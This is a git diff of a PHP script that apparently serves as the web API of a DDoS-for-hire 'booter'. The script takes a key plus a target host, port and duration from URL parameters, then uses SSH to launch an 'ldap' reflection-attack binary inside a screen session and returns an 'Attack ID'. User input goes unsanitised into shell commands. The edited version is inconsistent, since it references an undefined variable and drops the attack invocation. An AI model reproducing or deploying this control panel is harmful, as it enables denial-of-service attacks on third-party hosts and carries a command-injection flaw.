@@ -1,10 +1,13 @@
 <?php
 
-//made by @Psychadelix
-//discord Psychadelix#8740
+function generateRandomString($length = 5) {
+    return substr(str_shuffle(str_repeat($x='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
+}
 
 
-//mysql will be interigated soon.
+
+//made by @Psychadelix (Bas Kruithof)
+
 //$db = new mysqli("localhost", "root", "", "api-logs");
 
 //if (mysqli_connect_errno()) {
@@ -21,6 +24,8 @@ $pass = "password"; //make sure you set a strong password.
 
 //Check if the ssh2 function exists. If not kill the process.
 if (!function_exists("ssh2_connect"))  /* -> Kill the process if php ssh2 can't be found. */  die("function ssh2_connect not found.");
+
+if (!function_exists("curl_init"))  /* -> Kill the process if php ssh2 can't be found. */  die("could not find php7.0-curl. apt install php7.0-curl");
 
 //attempt to connect to the server.
 if (!($con = ssh2_connect($serverip, $port))){
@@ -49,36 +54,30 @@ else{
       if(in_array($_GET['key'], $key)){
         switch($command){
 
-          
+
           //https://example.com/api.php?command=ldap&key=admin&host=1.1.1.1&port=80&time=60
-          $host = $_GET['host'];
-          $port = $_GET['port'];
-          $time = $_GET['time'];
+
 
           case 'ldap':
 
-            if (empty($host) || empty($port) || empty($time)){
+          $hosts = $_GET['host'];
+          $port = $_GET['port'];
+          $time = $_GET['time'];
+
+            if (empty($hosts) || empty($port) || empty($time)){
               die('You have not specified proper attack arguments.');
             }
 
-            if (!($stream = ssh2_exec($con, "screen - ./ldap $host $port ldap.txt 2 250 $time "))){
+            if (!($stream = ssh2_exec($con, "screen -dmS $rand "))){
               print $command . " " . "failed to execute..";
               die();
             }
             else{
-              print('Command has been executed. without any errors.');
+              $get = generateRandomString();
+              print('Command has been executed. without any errors. <br><br> Attack ID: '. $get .':'. $hosts .' <br><br>Send this too staff incase of an attack not working.');
             }
           break;
 
-          case 'second':
-            if (!($stream = ssh2_exec($con, "screen -dmS second"))){
-              print $command . " " . "failed to execute..";
-              die();
-            }
-            else{
-                print('Command has been executed. without any errors.');
-              }
-          break;
 
           //throw this when the specified command is invalid.
           default :
